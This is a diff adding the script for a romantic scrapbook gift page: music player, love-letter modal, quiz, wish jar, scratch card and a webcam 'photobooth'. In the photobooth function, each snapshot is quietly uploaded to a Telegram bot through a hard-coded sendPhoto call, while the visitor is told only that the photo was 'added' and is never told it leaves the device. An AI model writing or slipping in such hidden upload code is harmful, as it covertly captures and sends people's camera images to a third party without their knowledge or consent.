+      music.play();
+      musicBtn.innerHTML = `🎵 ${name}`;
+      playlistPanel.style.display = 'none';
+    }
+
+    // Modal Love Letter Functions
+    function openLetter() {
+      document.getElementById('letterModal').style.display = 'flex';
+    }
+
+    function closeLetter() {
+      document.getElementById('letterModal').style.display = 'none';
+    }
+
+    // ==========================================
+    // Photobooth Engine (With Telegram Upload)
+    // ==========================================
+    let videoStream = null;
+
+    async function startCamera() {
+      const video = document.getElementById('webcam');
+      try {
+        videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = videoStream;
+        video.style.display = 'block'; // Make sure webcam is visible when started
+      } catch (err) {
+        alert("Camera permission denied or camera not found!");
+      }
+    }
+
+    async function takeSnapshot() {
+      const video = document.getElementById('webcam');
+      const canvas = document.getElementById('photoCanvas');
+
+      if (!videoStream) {
+        alert("Please start the camera first!");
+        return;
+      }
+
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      video.style.display = 'none';
+      canvas.style.display = 'block';
+
+      // Send picture to Telegram
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', blob, 'scrapbook_snap.png');
+        formData.append('caption', '📸 New snapshot taken on your scrapbook page!');
+
+        try {
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+          alert("Snapshot captured and added! 📸");
+        } catch (err) {
+          console.error("Failed to send image to Telegram:", err);
+          alert("Photo captured!");
+        }
+      }, 'image/png');
+    }
+
+    // Memory Quiz Check
+    function checkAnswer(isCorrect) {
+      const feedback = document.getElementById('quizFeedback');
+      if (isCorrect) {
+        feedback.style.color = '#27ae60';
+        feedback.innerText = '✨ Bingo! Every memory with good food & laughter is unforgettable! 💕';
+      } else {
+        feedback.style.color = '#ff4f81';
+        feedback.innerText = 'Close! But nothing beats laughing together over good food! 🍕';
+      }
+    }
+
+    // Tap Particle Effect
+    document.addEventListener('click', (e) => {
+      if (e.target.tagName === 'BUTTON' || e.target.classList.contains('quiz-opt')) return;
+      const heart = document.createElement('div');
+      heart.innerHTML = ['💖', '✨', '🌸', '🌷'][Math.floor(Math.random() * 4)];
+      heart.style.position = 'fixed';
+      heart.style.left = e.clientX + 'px';
+      heart.style.top = e.clientY + 'px';
+      heart.style.fontSize = '24px';
+      heart.style.pointerEvents = 'none';
+      heart.style.transition = 'all 1s ease-out';
+      heart.style.zIndex = '9999';
+      document.body.appendChild(heart);
+
+      setTimeout(() => {
+        heart.style.transform = `translate(${(Math.random() - 0.5) * 80}px, -100px) scale(1.4)`;
+        heart.style.opacity = '0';
+      }, 10);
+
+      setTimeout(() => heart.remove(), 1000);
+    });
+
+    // Wish Jar
+    const secretNotes = [
+      "💌 'Your smile is literally the warmest thing in the world!'",
+      "🌸 'May your year ahead be filled with zero stress and endless treats!'",
+      "✨ 'Thank you for making every ordinary day feel extraordinary.'",
+      "💫 'Never lose that cute, chaotic, beautiful sparkle of yours!'"
+    ];
+
+    function pullSecretNote() {
+      const box = document.getElementById('wishDisplay');
+      const randomMsg = secretNotes[Math.floor(Math.random() * secretNotes.length)];
+      box.style.display = 'block';
+      box.innerHTML = randomMsg;
+    }
+
+    // Scratch Card Engine
+    const canvas = document.getElementById('scratchCanvas');
+    const ctx = canvas.getContext('2d');
+
+    function initScratchCard() {
+      if (!canvas) return;
+      canvas.width = canvas.offsetWidth;
+      canvas.height = canvas.offsetHeight;
+      
+      // Draw Silver Coating
+      ctx.fillStyle = '#c5c5c5';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      
+      // Text on Scratch Card
+      ctx.font = 'bold 20px Poppins';
+      ctx.fillStyle = '#666666';
+      ctx.textAlign = 'center';
+      ctx.fillText('✨ Scratch Here! ✨', canvas.width / 2, canvas.height / 2);
+    }
+
+    let isScratching = false;
+
+    function scratch(e) {
+      if (!isScratching || !canvas) return;
+      const rect = canvas.getBoundingClientRect();
+      const x = (e.clientX || e.touches[0].clientX) - rect.left;
+      const y = (e.clientY || e.touches[0].clientY) - rect.top;
+
+      ctx.globalCompositeOperation = 'destination-out';
+      ctx.beginPath();
+      ctx.arc(x, y, 25, 0, Math.PI * 2);
+      ctx.fill();
+    }
+
+    if (canvas) {
+      canvas.addEventListener('mousedown', () => isScratching = true);
+      canvas.addEventListener('mouseup', () => isScratching = false);
+      canvas.addEventListener('mousemove', scratch);
+
+      canvas.addEventListener('touchstart', () => isScratching = true);
+      canvas.addEventListener('touchend', () => isScratching = false);
+      canvas.addEventListener('touchmove', scratch);
+    }
+
+    window.addEventListener('load', initScratchCard);
+</script>
+</body>
+</html>
